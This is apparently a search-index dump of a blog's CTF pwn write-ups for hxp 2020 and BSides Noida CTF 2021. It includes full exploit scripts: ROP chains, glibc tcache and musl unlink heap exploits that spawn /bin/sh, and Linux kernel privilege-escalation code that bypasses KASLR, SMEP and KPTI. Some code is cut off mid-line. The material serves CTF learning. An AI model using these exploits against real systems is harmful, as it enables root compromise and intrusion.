[rbp-20h] _fentry__(f, data, size, off); v5 = v4; v8 = __readgsqword(0x28u); if ( v4 \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 0x1000LL, v4); BUG(); } _check_object_size(hackme_buf, v4, 0LL); if ( copy_from_user(hackme_buf, data, v5) ) return -14LL; _memcpy(tmp, hackme_buf); return v5; } Sounds like quite easy and straightforward, we can leak address to get the kernel image base, compute commit_creds and prepare_kernel_cred function address and using ROP to get root, just like the challenge name “kernel ROP”. Well, no. If you consider this challenge as a normal KALSR and smep bypass, you will fail for sure. Firstly of course, we edit the init file to debug the kernel and print out address of commit_creds like below. / $ cat /proc/kallsyms | grep commit_creds ffffffffb614d360 T commit_creds ffffffffb6987d90 r __ksymtab_commit_creds ffffffffb69a0972 r __kstrtab_commit_creds ffffffffb69a4d42 r __kstrtabns_commit_creds / $ cat /proc/kallsyms | grep prepare_kernel_cred ffffffffb6096750 T prepare_kernel_cred ffffffffb698d4fc r __ksymtab_prepare_kernel_cred ffffffffb69a09b2 r __kstrtab_prepare_kernel_cred ffffffffb69a4d42 r __kstrtabns_prepare_kernel_cred And when we exit and do this again, wierd thing happens. / $ cat /proc/kallsyms | grep commit_creds ffffffff8ea7cc90 T commit_creds ffffffff8f587d90 r __ksymtab_commit_creds ffffffff8f5a0972 r __kstrtab_commit_creds ffffffff8f5a4d42 r __kstrtabns_commit_creds / $ cat /proc/kallsyms | grep prepare_kernel_cred ffffffff8eb2b4a0 T prepare_kernel_cred ffffffff8f58d4fc r __ksymtab_prepare_kernel_cred ffffffff8f5a09b2 r __kstrtab_prepare_kernel_cred ffffffff8f5a4d42 r __kstrtabns_prepare_kernel_cred The addresses does change, but we know that KASLR adds a random offset aligning to page size which means at least low bits should not change. What’s going on? After several frustrating hours, I found the reason. In Jun 2020, the patch [2] added one of the most annoying mitigation against kernel exploits: Function Granular Kernel Address Space Layout Randomization (fgkaslr). It rearranges kernel code at load time on a per-function level granularity, which means every function address can be different when loaded. Seems like this challenge is unexploitable. But suddenly, I found that not all the functions are rearranged, like __ksymtab_commit_creds just printed out above! So are there any relation between __ksymtab_commit_creds and commit_creds? I found out that every kernel symbol has a structure below, in which value_offset actually stored offset between address of the symbol and specific function. So if we get value_offset of __ksymtab_commit_creds, we can add to it and get the real address of commit_creds! truct kernel_symbol { int value_o","date":"2021-08-23","objectID":"/2021/08/hxp2020/:1:0","tags":null,"title":"Hxp2020","uri":"/2021/08/hxp2020/"},{"categories":["PWN"],"content":"pfoten | 18 solves | 370 points A challenge containing no bug module or driver. Note: The kernel is a standard Linux kernel, we didn’t add any vulnerabilities. Sounds like problems can only be found in init file x1do0@x1do0:~/kernel_learning/pfoten$ cat ./files/etc/init.d/rcS #!/bin/sh /bin/busybox --install -s stty raw -echo chown -R 0:0 / mkdir -p /proc \u0026\u0026 mount -t proc none /proc mkdir -p /dev \u0026\u0026 mount -t devtmpfs devtmpfs /dev mkdir -p /tmp \u0026\u0026 mount -t tmpfs tmpfs /tmp umask 111 dd if=/dev/zero bs=1M count=10 of=/swap status=none losetup /dev/loop0 /swap mkswap /dev/loop0 \u003e/dev/null swapon /dev/loop0 \u003e/dev/null I didn’t quite familiar with linux bash grammar. After looking for some information, I finally found out what he did. set mask of file mode creation[4] as 111, which means all users can open and read the following files created. add a 10MB size file /swap, filled with zero correlate /dev/loop0 with /swap using losetup[5] construct a swap space in loop0 using kaswap[6] and enable by swapon But to fully understand the meanings, we should go deep into linux swap files[7]. Shortly, swap files is a cache for physical RAM. When RAM memory is insufficient, kernel will copy some memory to swap files on the hard disk temporarily in order to leave more memory in RAM. So you might find the bugs here too. Swap files should never be directly writed by users because when the swap operation happens between RAM and swap files, deliberately constructed data writed in swap files will be directly copy to RAM memory! Let’s see what will happen if we keep mmaping to occupy virtual memory. #include \u003cstdio.h\u003e#include \u003cmemory.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/mman.h\u003e int main(int argc, char const *argv[]) { for (int i = 0; ; ++i) { char* buffer = mmap(NULL, 1024*1024, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); memset(buffer, 'A', 1024*1024); printf(\"%d\\n\", i); system(\"strings /swap\"); } return 0; } / $ /poc \u003e /tmp/out [ 39.624986] Out of memory: Killed process 79 (poc) total-vm:45108kB, anon-rss:40kB, file-rss:4kB, shmem-rss:36004kB,0 Killed / $ vi /tmp/out After a few iterations, swap file will be filled with other things, which is actually some infrequently used memory staff. ... bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0 stapsdt libc lll_lock_wait_private 8@%rdi stapsdt libc memory_mallopt_arena_max 8@%rax 8@32+mp_(%rip) stapsdt libc memory_mallopt_arena_test 8@%rax 8@24+mp_(%rip) stapsdt ... Aug 23 02:05:37 \u003c30\u003eAug 23 02:05:37 nit: starting pid 78, tty '': '-setuidgid 1 sh' starting pid 78, tty '': '-setuidgid 1 sh' ::sysinit:/etc/init.d/rcS ::once:-setuidgid 1 sh #!/bin/sh /bin/busybox --install -s stty raw -echo chown -R 0:0 / mkdir -p /proc \u0026\u0026 mount -t proc none /proc mkdir -p /dev \u0026\u0026 mount -t devtmpfs devtmpfs /dev mkdir -p /tmp \u0026\u0026 mount -t tmpfs tmpfs /tmp umask 111 dd if=/dev/zero bs=1M count=10 of=/swap status=none losetup /dev/loop0 /swap mkswap /dev/loop0 \u003e/dev/null swapon /dev/loop0 \u003e/dev/null D$(t L$8H []A\\A]A^ AWAVI AUATI []A\\A]A^A_ ATUI []A\\ ... You can see that even the memory of this ELF executable file was dumped into /swap. According to Mr.2019[8], we can garble the init or exit process of busybox to shellocode, cuz they are running on root privelege. After compiling busybox with symbols, we can find specific sequences which indicate where the functions are and whether the memory is swaped into /swap. I tried but it didn’t work for me, finding the sequences is a probablistic incident (actually quite rare). And even when I found the sequences after tons of failure, shellcode I write was not triggered at all. I discussed with my fellow teammate pu1p[9]. He found that edit syscall function can gain much higher probability to trigger shellcode we write. It turned out the same on my machine. What’s more, we use exit machine code as a needle to indicate where the exit is and whether it’s swaped. 0: 48 63 ff movsxd rdi, edi 3: b8 e7 00 00 0","date":"2021-08-23","objectID":"/2021/08/hxp2020/:2:0","tags":null,"title":"Hxp2020","uri":"/2021/08/hxp2020/"},{"categories":["PWN"],"content":"周末和学弟学妹一起打的一场比赛，比较基础，但涉及的知识面较广，有必要整理查漏补缺 url: https://ctftime.org/event/1397 rank 8 with lilac babystack: static link, find gadget to trigger your own syscall and ROP warmup: glibc2.32 (lastest version) tcache exploitation, xor bypass khop: basic linux kernel exploits, use-after-free and zero deference babymusl: musl libc heap exploits, unlink vulnerability and ROP suscall: basic linux kernel exploits, bugged syscall implemented by host trash: glibc2.32 off-by-null, trigger heap overlapping and double free Interpreter: virtual machine exploits, out-of-bound read and write ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:0:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"babystack 明显的栈溢出。 静态编译，什么gadget都有，syscall只开了orw，但是并没有找到open。 那就自己凑syscall吧 \"\"\" x1do0 / Lilac \"\"\" from pwn import * context.arch = 'amd64' # io = process(\"./babystack.out\") io = remote(\"34.136.150.230\", 49156) context.log_level = 'debug' open64 = 0x442BA0 read = 0x442CD0 write = 0x442D70 prdir = 0x00000000004018f4 prsir = 0x000000000040970e prdxr = 0x000000000040182f praxr = 0x0000000000410da4 mov_rax_rdi_ret = 0x0000000000413b14 syscall = 0x442D85 mprotect = 0x443AF0 target = 0x4bc000 rop = flat( prdir, 0, prsir, target+0x50, prdxr, 0x10, read, prdir, target+0x50, prsir, 0, praxr, 2, syscall, prdir, 3, prsir, target+0x100, prdxr, 0x30, read, prdir, 1, prsir, target+0x100, prdxr, 0x30, write) # gdb.attach(io, \"b *0x442D85\") io.sendline('\\x00'*0x48 + rop) io.send(\"flag.txt\") io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:1:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"warmup 2.32的新版本堆，明显的uaf，增删改打印功能齐全。还是改tcache的fd，打到free_hook，但是需要绕过tcache的异或检测。只需要在分配第一个tcache时uaf泄露出fd位置，便是异或的key（一开始的fd是0）。 详见 https://cloud.tencent.com/developer/article/1643954 \"\"\" yty \u0026 wangjihe / Lilac \"\"\" import os import sys import time from pwn import * libc_path = \"/usr/lib/glibc/2.32-0ubuntu3_amd64/libc-2.32.so\" elf_path = \"./a.out\" gdb_args = ''' b *(0x555555554000 + 0x13B5) b *(0x555555554000 + 0x16A2) ''' context.arch = \"amd64\" if len(sys.argv) == 3: context.log_level = 'error' else: context.log_level = 'info' context.terminal = ['tmux', 'splitw', '-h'] context.binary = elf_path libc = ELF(libc_path) elf = ELF(elf_path) def tob(a): if isinstance(a, str): return bytes(a, encoding=\"utf-8\") else: return bytes(str(a), encoding=\"utf-8\") if len(sys.argv) == 1 or sys.argv[1] == \"d\": io = gdb.debug(context.binary.path, gdb_args) elif len(sys.argv) == 3: if isinstance(sys.argv[2], int): io = remote(sys.argv[1], sys.argv[2]) elif isinstance(sys.argv[2], str) or isinstance(sys.argv[2], bytes): io = remote(sys.argv[1], int(sys.argv[2])) elif sys.argv[1] == \"l\": io = process(context.binary.path) else: io = remote(\"34.136.150.230\", 49153) def choice(v): io.sendlineafter(b\"=6= exit\\n\", tob(v)) def add(idx, size, data=b\"\"): choice(1) io.sendlineafter(b\"idx: \", tob(idx)) io.sendlineafter(b\"sz: \", tob(size)) if size != 0: io.sendlineafter(b\"data: \", data) def show(idx): choice(2) io.sendlineafter(b\"idx: \", tob(idx)) def edit(idx, data): choice(3) io.sendlineafter(b\"idx: \", tob(idx)) io.sendlineafter(b\"data: \", data) def rm(idx): choice(4) io.sendlineafter(b\"idx: \", tob(idx)) def save(idx): choice(5) io.sendlineafter(\"idx: \", tob(idx)) add(0,0x18,b\"a\") add(1,0x500,b\"a\") add(2,0x18,b\"a\") # 0x55555555b6e0 add(3,0x18,b\"a\") rm(0) add(0,0) show(0) io.recvuntil(b\"data: \") key = u64(io.recv(5) + b'\\0'*3) print(hex(key)) rm(1) add(1,0) show(1) io.recvuntil(b\"data: \") libc.address = u64(io.recv(6) + b'\\0'*2) - 0x1e4030 print(hex(libc.address)) add(9,0x18,b\"a\") rm(9) save(2) rm(2) edit(2,p64(libc.symbols[\"__free_hook\"] ^ key)) add(4,0x18) add(5,0x18,p64(libc.symbols[\"system\"])) add(6,0x28,b\"/bin/sh\\0\") rm(6) io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:2:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"khop 全局变量message uaf，开两个fd，close其中一个，另外一个还可以接着用。 static ssize_t dev_read(struct file *fp, char *buf, size_t size, loff_t *off) { char kernel_stack[48]; int len = strlen(message); if (*off \u003e= len) { return 0; /* end of file */ } memcpy(kernel_stack, message, len); if(len \u003e size - *off) { len = size - *off; } if(copy_to_user(buf, kernel_stack + *off, len)) { return -EFAULT; } *off += len; return len; } 启动脚本特意关掉了mmap_min_addr，所以直接mmap到0地址处，控制内容导致copy_to_user时造成内核栈溢出。cr4的gadget没得，只能在内核栈上提权了。 需要绕过canary、smep、KPTI，直接swapgs_restore_regs_and_return_to_usermode一把梭 /* x1do0 / Lilac */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cfcntl.h\u003e#include \u003csys/ioctl.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e#include \u003cunistd.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/types.h\u003e#include \u003cerrno.h\u003e struct trap_frame{ void *rip; unsigned long long cs; unsigned long long eflags; void *rsp; unsigned long long ss; }__attribute__((packed)); struct trap_frame tf; unsigned long long tf_addr = \u0026tf; #define KERNCALL __attribute__((regparm(3))) void* (*prepare_kernel_cred)(void*) KERNCALL = 0xffffffff810cc140; void* (*commit_creds)(void*) KERNCALL = 0xffffffff810cbdd0; uint64_t u64(char * s){ uint64_t result = 0; for (int i = 7 ; i \u003e=0 ;i--){ result = (result \u003c\u003c 8) | (0x00000000000000ff \u0026 s[i]); } return result; } void init_tf_work(void){ //__asm__ volatile(\".intel_syntax noprefix;\" // \"mov tf+8, cs;\" //set cs // \"pushf;pop tf+16;\" //set eflags // \"push rsp;pop tf+24;\" // \"mov tf+32, ss;\"); asm( \"movq %%cs, %0\\n\" \"movq %%ss, %1\\n\" \"movq %%rsp, %3;\\n\" \"pushfq\\n\" \"popq %2\\n\" : \"=r\"(tf.cs), \"=r\"(tf.ss), \"=r\"(tf.eflags), \"=r\"(tf.rsp) : : \"memory\"); tf.rip = 0xdeadbeef; tf.rsp -= 0; printf(\"[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx\\n\", tf.cs, tf.ss, tf.eflags, tf.rsp); } void get_shell(){ system(\"/bin/sh\"); } int main() { printf(\"[*] mmap at 0x100000, ret %x\\n\", mmap(0x100000, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0) ); int get_shell_64[] = {0x6a,0x68,0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x2f,0x73,0x50,0x48,0x89,0xe7,0x68,0x72,0x69,0x1,0x1,0x81,0x34,0x24,0x1,0x1,0x1,0x1,0x31,0xf6,0x56,0x6a,0x8; puts(\"[*] write shellocde\"); for(int i=0; i\u003csizeof(get_shell_64)/4 ;i++) { *(char *)(0x100000 + i) = get_shell_64[i]; } // extern int errno; int fd, fd2, exp_fd; fd = open(\"/dev/char_dev\", O_RDWR); fd2 = open(\"/dev/char_dev\", O_RDWR); exp_fd = open(\"/dev/char_dev\", O_RDWR); close(fd2); char *mem = mmap(0, 0x1000, 7, 50, -1, 0); char buffer[0x400]; memset(mem, '\\x00', 0x30); mem[0x30-1] = '\\n'; read(fd, buffer, 0x30-1); memset(mem, '\\x00', 0x30); mem[0x30] = '\\n'; // printf(\"[*] %d\\n\", lseek(fd, 0x28, SEEK_SET)); read(fd, buffer, 0x60); long long canary = u64(buffer+1); long long base = commit_creds - 0xcbdd0; long long gadget1 = 0xffffffff8104dec1; long long gadget2 = 0xffffffff8110f940; // long long iret = 0xffffffff81039a1b; // long long swapgs = 0xffffffff81c00aaf; long long pop_rsp_ret = 0xffffffff81020360; long long swapgs_and_iret = 0xffffffff81c00a4a; // 0x0000000000000730 : pop rdi ; ret // 0x00000000003d5380 : xchg rax, rdi ; ret // 0x00000000000064ed : pop rsp ; ret // printf(\"[*] %d\\n\", lseek(fd, 0, SEEK_SET)); memset(mem, '\\x00', 0x100); mem[0x100] = '\\n'; int i=0; long long *ropchain = (long long *)(mem+0x30); ropchain[i++] = canary; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = pop_rsp_ret; ropchain[i++] = 0xd00; init_tf_work(); ropchain = (long long *)(mem + 0xd00); i = 0; ropchain[i++] = gadget1; ropchain[i++] = 0; ropchain[i++] = prepare_kernel_cred; ropchain[i++] = gadget2; ropchain[i++] = 0; ropchain[i++] = commit_creds; ropchain[i++] = swapgs_and_iret; ropchain[i++] = 0; ropchain[i++] = 0; ropchain[i++] = \u0026get_shell; ropchain[i++] = tf.cs; // tf.cs, tf.ss, tf.eflags, tf.rsp ropchain[i++] = tf.eflags; ropchain[i++] = tf.rsp; ropchain[i++] = tf.ss; ropchain[i++] = 10; read(exp_fd, buffer, 0x60); // system(\"/","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:3:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"baby_musl 给的是docker，看一下dockerfile，server就是拿ubuntu2004直接apt装的musl #sudo docker build . -t test_chall#sudo docker run -d -p 1024:1024 --rm -it test_challFROMubuntu:20.04RUN useradd -d /home/ctf/ -m -p ctf -s /bin/bash ctfRUN echo \"ctf:ctf\" | chpasswdWORKDIR/home/ctfCOPY baby_musl .COPY flag.txt .COPY ynetd .RUN chown -R root:root /home/ctfRUN apt-get update \u0026\u0026 apt-get -y dist-upgrade \u0026\u0026 apt-get -y install muslUSERctfEXPOSE1024CMD ./ynetd -p 1024 ./baby_musl 所以本地就拿2004做就行，musl libc版本信息如下 musl libc (x86_64) Version 1.1.24 Dynamic Program Loader Usage: /lib/x86_64-linux-musl/libc.so [options] [--] pathname [args] musl堆题，保护全开，有两个洞。 前面add的时候要求idx\u003c4，但show没检查idx unsigned __int64 show() { __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); puts((const char *)chunks[v1]); return __readfsqword(0x28u) ^ v2; 而chunk和size又是挨在一起的，向size处填充地址，在show的时候将其解析为地址，实现任意地址读。 .bss:0000000000202040 ; _QWORD chunks[4] .bss:0000000000202040 chunks dq 4 dup(?) ; DATA XREF: new+7B↑o .bss:0000000000202040 ; del+51↑o ... .bss:0000000000202060 public data .bss:0000000000202060 ; _DWORD data[4] .bss:0000000000202060 data dd 4 dup(?) ; DATA XREF: new+98↑o .bss:0000000000202060 ; edit+79↑o .bss:0000000000202060 _bss ends free的时候也没有清空指针 unsigned __int64 del() { unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); if ( v1 \u003c= 3 \u0026\u0026 chunks[v1] ) free((void *)chunks[v1]); return __readfsqword(0x28u) ^ v2; } 这里简单总结一下musl与glibc的堆管理区别： musl没有hook musl作为轻量级libc，在分配堆块时会首先考虑libc上的空闲页，不会直接开在heap段上，但这样也使得堆上到处都是libc地址。 musl类似于只有smallbin和largebin，一般unlink是十分奏效的利用方式 最后思路为：堆上拿到残留的libc地址，利用任意地址读environ拿到栈地址，再在栈上拿到elf加载地址。unlink打到bss段堆指针，实现任意地址写，最后写rop即可。 \"\"\" x1do0 / Lilac \"\"\" from pwn import * def choice(ch): io.sendlineafter(\"[4] Show\\n\", str(ch)) def new(idx, size): choice(1) io.sendlineafter(\"Enter index\", str(idx)) io.sendlineafter(\"Enter size\", str(size)) def remove(idx): choice(2) io.sendlineafter(\"Enter index\", str(idx)) def edit(idx, con): choice(3) io.sendlineafter(\"Enter index\", str(idx)) io.sendafter(\"Enter data\", con) def show(idx): choice(4) io.sendlineafter(\"Enter index\", str(idx)) context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] # b *0xA25+0x555555554000 del # b *0x988+0x555555554000 add debug = \"\"\" b *0xC31+0x555555554000 set $data = 0x202040 + 0x555555554000 \"\"\" # debug = '' io = process(\"./baby_musl\") # gdb.attach(io, debug) io.sendafter(\"Enter your name\", 'xd') elf = ELF(\"./baby_musl\") libc = elf.libc new(0, 0x10) new(1, 0x30) remove(0) show(0) io.recvuntil(\"\\n\") libc.address = u64(io.recv(6) + b'\\x00\\x00') - 0xb0a40 print(hex(libc.address)) stack = libc.sym['environ'] print(hex(stack)) new(2, stack \u0026 0xffffffff) new(3, stack \u003e\u003e 32) show(5) io.recvuntil(\"\\n\") stack_addr = u64(io.recv(6) + b'\\x00\\x00') - 0xb0a40 print(hex(stack_addr)) target = stack_addr + 0xb09f0 print(hex(target)) elf_addr = target + 0x30 new(2, elf_addr \u0026 0xffffffff) new(3, elf_addr \u003e\u003e 32) show(5) io.recvuntil(\"\\n\") elf_base = u64(io.recv(6) + b'\\x00\\x00') - 0x796 print(hex(elf_base)) new(0, 0x80) remove(0) edit(0, p64(elf_base + 0x202040-0x18) + p64(elf_base + 0x202040 - 0x10)) new(1, 0x80) # new(2, 0x10) system = libc.sym['system'] binsh = next(libc.search(b\"/bin/sh\")) pop_rdi_ret = libc.address + 0x0000000000015291 edit(0, p64(target)*3) edit(0, p64(pop_rdi_ret) + p64(binsh) + p64(system)) choice(666) io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:4:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"teensum 草 直球栈溢出，这题没人做？ 给了docker和libc，实际上就是ubuntu20.04，libc也没做什么手脚。 x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum /lib/x86_64-linux-gnu/libc-2.31.so d371da546786965fe0ee40147ffef716 /lib/x86_64-linux-gnu/libc-2.31.so x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum libc.so.6 d371da546786965fe0ee40147ffef716 libc.so.6 开了pie，但是栈上本来就有残留地址，直接日就完事了。 \"\"\" x1do0 / Lilac \"\"\" from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] io = process(\"./teen-sum\", aslr=False) # gdb.attach(io, \"b *0x138B+0x555555554000\") libc = ELF(\"./libc.so.6\") io.sendlineafter(\"\u003e \", str(0xa0)) io.sendafter(\"\u003e \", '\\n') io.recvuntil(\"Hey \") libc_base = u64(io.recv(6) + b'\\x00\\x00') - 0x227e0a print(hex(libc_base)) io.sendlineafter(\"How many?\", str(1)) io.sendlineafter(\"Please enter them one by one.\", str(1)) io.sendlineafter(\"1. Yes\", str(1)) io.sendlineafter(\"New size please.\u003e\", str(0x100)) prdir = libc_base + 0x0000000000026b72 # pop rdi ; ret system = libc_base + libc.sym['system'] binsh = libc_base + next(libc.search(b\"/bin/sh\")) empty_ret = libc_base + 0x0000000000025679 rop = flat(empty_ret, prdir, binsh, system) io.sendlineafter(\"New Name please ^.^ :\", b'a'*0x38 + p64(0x100) + b'a'*8 + rop) io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:5:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"suscall 题目提供了一个任意函数执行的漏洞系统调用，把reboot关了跑一下。妈的直接暴毙 [ 0.033687] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline [ 0.100000] ..MP-BIOS bug: 8254 timer not connected to IO-APIC [ 0.430283] Kernel panic - not syncing: Out of memory and no killable processes... [ 0.430283] [ 0.430627] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.4.271 #8 [ 0.430804] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014 [ 0.431059] 0000000000000000 ffff8800028eb928 ffffffff834bbc18 ffffffff837ac6e0 [ 0.431104] ffff8800028eb9b8 ffff8800028eb9a8 ffffffff834bab4f 0000000000000008 [ 0.431104] ffff8800028eb9b8 ffff8800028eb950 6170203035373032 0000000000000246 [ 0.431104] Call Trace: [ 0.431104] [\u003cffffffff834bbc18\u003e] dump_stack+0x57/0x6d [ 0.431104] [\u003cffffffff834bab4f\u003e] panic+0xb9/0x1fd [ 0.431104] [\u003cffffffff82d21aa3\u003e] out_of_memory+0x423/0x490 [ 0.431104] [\u003cffffffff82d27412\u003e] __alloc_pages_nodemask+0xa62/0xa90 [ 0.431104] [\u003cffffffff82d2bc8b\u003e] ? release_pages+0x8b/0x1f0 [ 0.431104] [\u003cffffffff82d63cee\u003e] alloc_page_interleave+0x3e/0x90 [ 0.431104] [\u003cffffffff82d641a4\u003e] alloc_pages_current+0xb4/0x110 [ 0.431104] [\u003cffffffff82d1dc58\u003e] __page_cache_alloc+0xb8/0xe0 [ 0.431104] [\u003cffffffff82d1e868\u003e] pagecache_get_page+0x88/0x1b0 [ 0.431104] [\u003cffffffff82d1e9b4\u003e] grab_cache_page_write_begin+0x24/0x40 [ 0.431104] [\u003cffffffff82d98ce4\u003e] simple_write_begin+0x24/0x190 [ 0.431104] [\u003cffffffff82d1e193\u003e] generic_perform_write+0xb3/0x1a0 [ 0.431104] [\u003cffffffff834c2fed\u003e] ? down_write+0xd/0x40 [ 0.431104] [\u003cffffffff82d1f4e4\u003e] __generic_file_write_iter+0x104/0x1b0 [ 0.431104] [\u003cffffffff82d1f669\u003e] generic_file_write_iter+0xd9/0x200 [ 0.431104] [\u003cffffffff83b3c795\u003e] ? initcall_blacklist+0xaa/0xaa [ 0.431104] [\u003cffffffff82d728f0\u003e] __vfs_write+0xb0/0xe0 [ 0.431104] [\u003cffffffff82d73301\u003e] vfs_write+0x91/0x180 [ 0.431104] [\u003cffffffff83b3c795\u003e] ? initcall_blacklist+0xaa/0xaa [ 0.431104] [\u003cffffffff82d73f14\u003e] SyS_write+0x44/0xb0 [ 0.431104] [\u003cffffffff83b3e11d\u003e] xwrite+0x29/0x5c [ 0.431104] [\u003cffffffff83b3de5b\u003e] ? md_run_setup+0x94/0x94 [ 0.431104] [\u003cffffffff83b3e706\u003e] do_copy+0x29/0xb6 [ 0.431104] [\u003cffffffff83b3defc\u003e] write_buffer+0x26/0x37 [ 0.431104] [\u003cffffffff83b3e560\u003e] unpack_to_rootfs+0xf2/0x26f [ 0.431104] [\u003cffffffff83b3e8a0\u003e] ? maybe_link.part.4+0x10d/0x10d [ 0.431104] [\u003cffffffff83b3e8fc\u003e] populate_rootfs+0x5c/0x108 [ 0.431104] [\u003cffffffff82c003b7\u003e] do_one_initcall+0x87/0x1a0 [ 0.431104] [\u003cffffffff83b3cfa7\u003e] kernel_init_freeable+0x159/0x1ec [ 0.431104] [\u003cffffffff834bf4d0\u003e] ? rest_init+0x80/0x80 [ 0.431104] [\u003cffffffff834bf4d9\u003e] kernel_init+0x9/0xe0 [ 0.431104] [\u003cffffffff834c4ed5\u003e] ret_from_fork+0x55/0x80 [ 0.431104] [\u003cffffffff834bf4d0\u003e] ? rest_init+0x80/0x80 [ 0.431104] Rebooting in 1 seconds.. 看了一眼发现开完gzip太大了，所以启动脚本还是不能直接打包成cpio就送进去。顺便改了一下题目启动脚本（甚至有错别字） 这是题目给的脚本，paneic=1是什么鬼？ qemu-system-x86_64 -m 128M -initrd initramfs.cpio -kernel ./bzImage -nographic -monitor /dev/null -append \"kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet\" -s 2\u003e/dev/null 改了一下，能跑了 #!/bin/bash gcc exp.c -static -masm=intel -fno-stack-protector -o exploit # gcc -o exp -static -fno-stack-protector -DREMOTE -nostdlib poc.c cp exp files/ cd files find . | cpio -o --format=newc \u003e ../rootfs.cpio cd .. gzip rootfs.cpio read input if [ \"$input\" == \"y\" ]; then echo 'wrong' exit fi qemu-system-x86_64 -m 128M -initrd rootfs.cpio.gz \\ -no-reboot \\ -kernel ./bzImage -nographic -monitor /dev/null \\ -append \"kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet\" -s 开了kaslr，但是并没有开kptr_restrict / $ cat /proc/sys/kernel/kptr_restrict 0 / $ cat /proc/sys/kernel/perf_event_paranoid 1 所以每次读出来地址就行，然后调用它的syscall在内核态拿到root /* x1do0 / Lilac */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/syscall.h\u003e#include \u003cunistd.h\u003e #define __NR_SUSCALL 546 #define KERNCALL __attribute__((regparm(3))) void* (*prepare_kernel_cred)(void*) KERNCALL = 0; void* (*commit_creds)(void*) KERNCALL = 0; void get_root(){ commit_creds(prepare_kernel_cred(0))","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:6:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"trash 直接给了堆地址，用于绕过2.32的异或检测。 C++堆，用allocator开的堆，但并没有考常规c++析构函数的double free，而是一个明显的off-by-null。 __int64 __fastcall sub_26A3(_QWORD *a1) { char v1; // bl int v3; // [rsp+18h] [rbp-18h] int i; // [rsp+1Ch] [rbp-14h] v3 = -1; for ( i = 0; i \u003c (unsigned __int64)get_len(a1); ++i ) { v1 = getchar(); *(_BYTE *)check_add(a1, i) = v1; if ( *(_BYTE *)check_add(a1, i) == '\\n' ) { v3 = i + 1; break; } v3 = i + 1; } *(_BYTE *)no_check_add(a1, v3) = 0; // off-by-null return (unsigned int)v3; 但这个'\\x00’也导致了后续利用的困难，因为打印函数会在此截断。 __int64 __fastcall sub_275A(__int64 a1) { char *v1; // rax int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; *(_BYTE *)check_add(a1, i); ++i ) { v1 = (char *)check_add(a1, i); std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, (unsigned int)*v1); } return std::ostream::operator\u003c\u003c(\u0026std::cout, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); } 总的来说这题比较麻烦的点在于： 所有的读入后面都会添加\\x00，同时\\n也会读入 没有free，只有类似于realloc改变大小时顺带的free 开了sandbox，只能orw glibc2.32 在输入堆地址时记得mask一下 令人痛心的是，新版本的setcontext已经不用rdi了，导致只能rop Dump of assembler code for function setcontext: 0x000015555517b0a0 \u003c+0\u003e: endbr64 0x000015555517b0a4 \u003c+4\u003e: push rdi 